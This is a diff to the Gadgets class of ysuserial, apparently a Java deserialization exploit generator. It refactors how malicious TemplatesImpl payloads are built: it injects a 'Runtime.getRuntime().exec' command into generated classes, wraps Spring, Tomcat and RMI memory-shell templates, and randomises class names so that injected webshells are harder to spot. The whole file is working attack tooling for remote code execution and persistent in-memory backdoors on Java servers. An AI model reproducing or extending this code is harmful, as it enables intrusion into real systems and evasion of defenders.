@@ -2,17 +2,14 @@ package org.su18.ysuserial.payloads.util;
 
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
-import static org.su18.ysuserial.GeneratePayload.IS_INHERIT_ABSTRACT_TRANSLET;
-import static org.su18.ysuserial.GeneratePayload.IS_OBSCURE;
+import static org.su18.ysuserial.payloads.config.Config.*;
 import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
+import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.Serializable;
 import java.lang.reflect.*;
-import java.util.HashMap;
-import java.util.Map;
-import java.util.Objects;
+import java.util.*;
 import java.util.zip.GZIPOutputStream;
 
 import javassist.*;
@@ -39,13 +36,6 @@ public class Gadgets {
 	}
 
 	public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
-
-	// required to make TemplatesImpl happy
-	public static class CheckCPUTime implements Serializable {
-
-		private static final long serialVersionUID = 8207363842866235160L;
-	}
-
 
 	public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
 		return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
@@ -168,9 +158,10 @@ public class Gadgets {
 
 
 	public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, String cName, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
-		final T   templates  = tplClass.newInstance();
-		byte[]    classBytes = new byte[0];
-		ClassPool pool       = ClassPool.getDefault();
+		final T   templates    = tplClass.newInstance();
+		byte[]    classBytes   = new byte[0];
+		ClassPool pool         = ClassPool.getDefault();
+		String    newClassName = generateClassName();
 
 		pool.insertClassPath(new ClassClassPath(abstTranslet));
 		CtClass superClass = pool.get(abstTranslet.getName());
@@ -179,11 +170,8 @@ public class Gadgets {
 
 		// 如果 Command 不为空，则是普通的命令执行
 		if (command != null) {
-			String time = String.valueOf(System.nanoTime());
-
-			// 如果指定短 payload，则动态创建一个超级短的恶意类
 			if (!IS_OBSCURE) {
-				ctClass = pool.makeClass("A" + time);
+				ctClass = pool.makeClass(newClassName);
 				// 创建无参构造方法
 				CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
 				ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
@@ -195,8 +183,7 @@ public class Gadgets {
 				ctClass = pool.get("org.su18.ysuserial.payloads.templates.CommandTemplate");
 
 				// 由于使用了 Thread 修改内部类
-				String className = ctClass.getName();
-				ctClass.setName(className + time);
+				ctClass.setName(newClassName);
 				// 修改字段
 				String cmd = "cmd = \"" + command + "\";";
 				ctClass.makeClassInitializer().insertBefore(cmd);
@@ -225,17 +212,17 @@ public class Gadgets {
 
 				String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
 				CtClass springTemplateClass = pool.get(target);
-				// 类名后加时间戳
-				String clazzName = target + System.nanoTime();
-				springTemplateClass.setName(clazzName);
+				springTemplateClass.setName(newClassName);
 				String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
-				// 修改b64字节码
+
+				// 修改b64字节码及类名
 				String b64content = "b64=\"" + encode + "\";";
 				ctClass.makeClassInitializer().insertBefore(b64content);
-				// 修改 SpringInterceptorMemShell 随机命名 防止二次打不进去
-				String clazzNameContent = "clazzName=\"" + clazzName + "\";";
+				String clazzNameContent = "clazzName=\"" + newClassName + "\";";
 				ctClass.makeClassInitializer().insertBefore(clazzNameContent);
-				ctClass.setName(className + System.nanoTime());
+
+				// 修改类名
+				ctClass.setName(generateClassName());
 				classBytes = ctClass.toBytecode();
 
 			} else if (className.contains("RMIBindTemplate")) {
@@ -266,14 +253,9 @@ public class Gadgets {
 				insertCMD(ctClass);
 				ctClass.addMethod(CtMethod.make("public String getDefaultDomain(javax.security.auth.Subject subject) throws java.io.IOException {return new String(execCmd(((java.security.Principal)subject.getPrincipals().iterator().next()).getName()).toByteArray());}", ctClass));
 
-				ctClass.setName(className + System.nanoTime());
+				ctClass.setName(newClassName);
 				classBytes = ctClass.toBytecode();
 			} else {
-				// 其他的通过类名自定义加载，NeoReg 不改类名
-				if (!"org.su18.ysuserial.payloads.templates.TLNeoRegFromThread".equals(className)) {
-					// 测试方便调试暂时不改类名
-					ctClass.setName(className + System.nanoTime());
-				}
 
 				// 配置恶意类不继承 AbstractTranslet 时，无需使用 ClassLoaderTemplate 进行封装
 				// 否则在恶意类自身存在父类时，无法继承 AbstractTranslet，需要使用 ClassLoaderTemplate 进行封装
@@ -326,7 +308,7 @@ public class Gadgets {
 		// 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
 		if (bytes != null) {
 			ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
-			ctClass.setName(ctClass.getName() + System.nanoTime());
+			ctClass.setName(generateClassName());
 			ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
 			GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
 			gzipOutputStream.write(bytes);
@@ -358,7 +340,10 @@ public class Gadgets {
 			// inject class bytes into instance
 			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
 		} else {
-			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(CheckCPUTime.class)});
+			CtClass newClass = pool.makeClass(generateClassName());
+			newClass.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", newClass));
+
+			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, newClass.toBytecode()});
 			// 当 _transletIndex >= 0 且 classCount 也就是生成类的数量大于 1 时，不需要继承 AbstractTranslet
 			Reflections.setFieldValue(templates, "_transletIndex", 0);
 		}
@@ -399,34 +384,15 @@ public class Gadgets {
 		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
 		String method = "";
 
-		CtClass[] classes = ctClass.getInterfaces();
-		for (CtClass aClass : classes) {
-			String iName = aClass.getName();
-			if (iName.equals("javax.servlet.Servlet")) {
-				method = "service";
-				break;
-			} else if (iName.equals("javax.servlet.Filter")) {
-				method = "doFilter";
-				break;
-			} else if (iName.equals("javax.servlet.ServletRequestListener")) {
-				method = "requestInitializedHandle";
-				isTomcat = false;
-				break;
-			} else if (iName.equals("javax.websocket.MessageHandler$Whole")) {
-				method = "onMessage";
-				isTomcat = false;
-				break;
-			} else if (iName.equals("org.apache.coyote.UpgradeProtocol")) {
-				method = "accept";
-				isTomcat = false;
+		List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
+		classes.add(ctClass.getSuperclass());
+
+		for (CtClass value : classes) {
+			String className = value.getName();
+			if (KEY_METHOD_MAP.containsKey(className)) {
+				method = KEY_METHOD_MAP.get(className);
 				break;
 			}
-		}
-
-		CtClass supClass = ctClass.getSuperclass();
-		if (supClass != null && supClass.getName().equals("org.apache.tomcat.util.threads.ThreadPoolExecutor")) {
-			method = "execute";
-			isTomcat = false;
 		}
 
 		switch (type) {
@@ -495,6 +461,8 @@ public class Gadgets {
 
 				break;
 		}
+
+		ctClass.setName(generateClassName());
 	}
 
 	public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
